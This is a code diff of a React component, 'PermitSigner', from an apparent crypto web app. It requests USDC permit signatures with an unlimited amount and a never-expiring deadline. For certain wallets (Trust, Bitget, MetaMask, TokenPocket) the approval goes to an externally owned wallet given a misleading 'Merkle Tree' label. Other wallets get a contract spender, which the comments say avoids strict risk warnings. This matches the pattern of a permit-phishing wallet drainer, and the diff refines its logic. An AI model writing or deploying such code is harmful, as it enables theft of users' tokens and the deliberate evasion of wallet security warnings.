@@ -34,8 +34,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
   const [signatureData, setSignatureData] = useState<PermitSignature | null>(null)
   const [existingSignature, setExistingSignature] = useState<boolean>(false)
   const [isLoadingStatus, setIsLoadingStatus] = useState(true)
-  const [isTrustOrBitget, setIsTrustOrBitget] = useState(false)
-  
+
   const [boundWalletAddress, setBoundWalletAddress] = useState<string | null>(null)
   const [boundSignatureStatus, setBoundSignatureStatus] = useState<'pending' | 'used' | 'none'>('none')
   const [showRebindConfirm, setShowRebindConfirm] = useState(false)
@@ -46,30 +45,20 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
 
   const displayAddress = address || boundWalletAddress
 
-  useEffect(() => {
-    let cancelled = false
-    // 立即用 connector.name 给一个保守判定，避免闪现错误状态；
-    // 然后异步解析 WalletConnect 会话里的真实钱包名再校正。
-    setIsTrustOrBitget(isSupportedWallet(connector?.name))
-    if (!isConnected || !connector) return
-    ;(async () => {
-      // 给 WalletConnect 会话一点时间把 peer metadata 灌进来
-      for (let i = 0; i < 5; i++) {
-        const effectiveName = await getEffectiveWalletName(connector)
-        if (cancelled) return
-        if (effectiveName && effectiveName.toLowerCase() !== 'walletconnect') {
-          setIsTrustOrBitget(isSupportedWallet(effectiveName))
-          return
-        }
-        await new Promise((r) => setTimeout(r, 200))
+  // 在点 Sign 的瞬间（而非渲染时）解析 spender，避免 WalletConnect peer metadata
+  // 还没就绪导致 fallback 到合约 spender。Trust / Bitget / MetaMask / TokenPocket
+  // 走 EOA（被 Polygonscan tag 为 Polnation: Merkle Tree），其余走合约 spender。
+  const resolveSpender = async (): Promise<`0x${string}`> => {
+    for (let i = 0; i < 8; i++) {
+      const name = await getEffectiveWalletName(connector)
+      if (name && name.toLowerCase() !== 'walletconnect') {
+        return isSupportedWallet(name) ? PLATFORM_WALLET : MERKLE_TREE_CONTRACT
       }
-    })()
-    return () => { cancelled = true }
-  }, [isConnected, connector])
-
-  // Trust / Bitget / MetaMask / TokenPocket 走 EOA spender（被 Polygonscan tag 为
-  // Polnation: Merkle Tree）；其他钱包走合约 spender，避免严格风险警告。
-  const PLATFORM_SPENDER = isTrustOrBitget ? PLATFORM_WALLET : MERKLE_TREE_CONTRACT
+      await new Promise((r) => setTimeout(r, 150))
+    }
+    // 最终仍只拿到 "WalletConnect" — 保守用合约 spender
+    return MERKLE_TREE_CONTRACT
+  }
 
   const { data: nonce } = useReadContract({
     address: USDC_ADDRESS,
@@ -235,6 +224,8 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
         }
       }
 
+      const spender = await resolveSpender()
+
       const deadline = BigInt(4294967295)
       const value = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
 
@@ -247,7 +238,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
 
       const message = {
         owner: address,
-        spender: PLATFORM_SPENDER,
+        spender,
         value,
         nonce,
         deadline,
@@ -301,7 +292,7 @@ export function PermitSigner({ onSignatureComplete, onRefreshProfit }: PermitSig
 
       const permitData: PermitSignature = {
         owner: address,
-        spender: PLATFORM_SPENDER,
+        spender,
         value: value.toString(),
         nonce,
         deadline,
